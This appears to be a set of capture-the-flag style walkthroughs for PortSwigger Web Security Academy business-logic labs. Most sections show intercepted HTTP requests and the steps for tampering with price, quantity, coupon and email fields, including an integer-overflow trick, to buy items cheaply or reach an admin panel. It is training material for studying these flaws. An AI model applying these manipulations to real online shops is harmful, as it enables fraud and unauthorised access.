# Business logic vulnerabilities


<details>
  <summary>Lab: Excessive trust in client-side controls</summary>

1. login using ``wiener:peter``
2. navigate ``home`` page and select product
3. Click ``add to cart`` with intercept the request

```http
POST /cart HTTP/1.1
Host: 0a43003003147e1c811880e3005d006f.web-security-academy.net
Cookie: session=4kC0DYbpfMKStrmFfEaBoLoLBYYPDH5K
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: https://0a43003003147e1c811880e3005d006f.web-security-academy.net
Referer: https://0a43003003147e1c811880e3005d006f.web-security-academy.net/product?productId=17
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive



productId=17&redir=PRODUCT&quantity=1&price=4817
```



set ``price`` to ``1``

```url
productId=17&redir=PRODUCT&quantity=1&price=1
```

back to cart and cilck ``place order``

![image](https://github.com/user-attachments/assets/2b7dbfc5-e7ed-4038-b01e-bb46220eaa69)



  
</details>







<details>
  <summary>Lab: High-level logic vulnerability</summary>

1. login using ``wiener:peter``
2. navigate ``home`` page and select product
3. Click ``add to cart`` with intercept the request

```http
POST /cart HTTP/1.1
Host: 0a43003003147e1c811880e3005d006f.web-security-academy.net
Cookie: session=4kC0DYbpfMKStrmFfEaBoLoLBYYPDH5K
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: https://0a43003003147e1c811880e3005d006f.web-security-academy.net
Referer: https://0a43003003147e1c811880e3005d006f.web-security-academy.net/product?productId=17
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive



productId=1&redir=PRODUCT&quantity=1
```

Notice that there is not ``price`` parameter but there is ``quantity`` try to put it with negative:

```url
productId=1&redir=PRODUCT&quantity=-1
```
notice that the price also became negative

![image](https://github.com/user-attachments/assets/b198bffa-1368-4b26-b5c1-5901bdd4fc4f)

if you click ``place order`` this error appear

```http
Cart total price cannot be less than zero
```

> ### now try to shoose cheep product and add it more than one time with negative and add the wanted product just one time with positive:

![image](https://github.com/user-attachments/assets/4a57f6fa-320e-400f-9596-54e2305cf0f3)


  
</details>










<details>
  <summary>Lab: Inconsistent security controls</summary>

1. after doing enumration

```
gobuster dir -u https://0a4800b704e8549d827179ca0018004d.web-security-academy.net -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt 
```
![image](https://github.com/user-attachments/assets/25a10fc0-e937-49c5-9888-c7c06a2ce3b5)

2. try to navigate ``/amdin`` found

![image](https://github.com/user-attachments/assets/ae0455f2-bc54-4b03-ada3-65bfddb111bf)

```
Admin interface only available if logged in as a DontWannaCry user 
```

3. when rigester found this note

```http
If you work for DontWannaCry, please use your @dontwannacry.com email address
```

4. after rigester change ``email`` to ``anyname@dontwannacry.com``

![image](https://github.com/user-attachments/assets/e42e3404-ed42-4b35-b3f6-00c66de07a09)
  
6. now you have acccess to ``/admin``
7. delete ``carlos``

  
</details>








<details>
  <summary>Lab: Flawed enforcement of business rules</summary>


1. login using ``wiener:peter``
2. noties that there is coupon code

![image](https://github.com/user-attachments/assets/33b61cbd-4518-483e-aa65-708598452798)

```
NEWCUST5
```

3. At the bottom of the page, sign up to the newsletter. You receive another coupon code, ``SIGNUP30``.
> ### 4. try applying the codes more than once. Notice that if you enter the same code twice in a row, it is rejected because the coupon has already been applied. However, if you alternate between the two codes, you can bypass this control. 

![image](https://github.com/user-attachments/assets/e559ab83-5443-4e58-a997-690205f73749)

5. click ``place order``


  
</details>














<details>
  <summary>Lab: Low-level logic flaw</summary>


1. login using ``wiener:peter``
2. navigate ``home`` page and select product
3. Click ``add to cart`` with intercept the request
4. if you add a larg number of `quantity` the ``price`` will happend ``integer overflow`` and it will count from negtive

```http
POST /cart HTTP/2
Host: 0a4f008503c158c382ac42ea00130067.web-security-academy.net
Cookie: session=F1AyWAioFLqVDYMZxyMuY0MDZzrYqBcj
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://0a4f008503c158c382ac42ea00130067.web-security-academy.net
Referer: https://0a4f008503c158c382ac42ea00130067.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers



productId=1&redir=PRODUCT&quantity=90
```

5. you need   ``2147483647 / 133700 = ~16061 `` jacked
6. you will send this request ``162`` time

```url
productId=1&redir=PRODUCT&quantity=99
```

![image](https://github.com/user-attachments/assets/aaf9f3d3-dd79-4038-9aec-f36de6ade157)

![image](https://github.com/user-attachments/assets/d7e834db-2b69-4c2b-b9a9-642b59ab67c3)

7. now try to buy cheep product more than one time until reach ``small positive`` price
8. now click ``place order``



  
</details>













<details>
  <summary>Lab: Inconsistent handling of exceptional input</summary>



  
</details>


















